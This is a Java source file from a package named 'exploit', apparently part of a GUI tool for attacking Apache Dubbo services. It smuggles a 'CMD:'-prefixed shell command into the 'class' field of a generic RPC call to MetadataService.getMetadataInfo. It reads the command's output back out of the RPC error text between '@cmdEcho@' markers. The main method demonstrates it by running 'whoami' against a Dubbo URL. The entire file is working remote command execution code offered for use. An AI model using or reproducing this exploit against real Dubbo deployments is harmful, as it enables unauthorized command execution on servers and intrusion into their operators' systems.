package exploit;

import org.apache.dubbo.common.logger.support.FailsafeLogger;
import org.apache.dubbo.config.ApplicationConfig;
import org.apache.dubbo.config.ReferenceConfig;
import org.apache.dubbo.rpc.service.GenericService;

import javax.swing.*;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ExecuteCmd {
    public static final String CMD_PREFIX = "CMD:";
    public static final String CMD_SPLIT = "@cmdEcho@";
    public static void exec(String cmd, JTextArea jTextArea,String charset,String url){
        FailsafeLogger.setDisabled(true);
        ReferenceConfig<GenericService> referenceConfig = new ReferenceConfig<>();
        referenceConfig.setRetries(0);
        referenceConfig.setApplication(new ApplicationConfig("test"));
        referenceConfig.setInterface("test1");
        referenceConfig.setUrl(url);
        referenceConfig.setGeneric(true);
        referenceConfig.setTimeout(100000);

        GenericService genericService = referenceConfig.get();
        HashMap map = new HashMap();
        if (charset.equals("UTF-8")){
            map.put("class", CMD_PREFIX+"u"+cmd);
        }else {
            map.put("class", CMD_PREFIX + "g" + cmd);
        }
        try {
            genericService.$invoke(
                    "getMetadataInfo",
                    new String[]{"java.lang.String"},
                    new Object[]{map});
        }catch (org.apache.dubbo.rpc.RpcException e){
            String regex = "(?s)"+CMD_SPLIT+"(.*?)"+ CMD_SPLIT;
            Pattern pattern = Pattern.compile(regex);

            Matcher matcher = pattern.matcher(e.toString());
            if (matcher.find()) {
                String result = matcher.group(1);
                if (jTextArea != null) {
                    jTextArea.setText(result);
                }else{
                    System.out.println("执行命令结果:\n"+result);
                }
            }

        }
    }

    public static void main(String[] args) throws Exception{
        exec("whoami",null,"utf-8","dubbo://127.0.0.1:20880/demo-provider/org.apache.dubbo.metadata.MetadataService");

    }
}
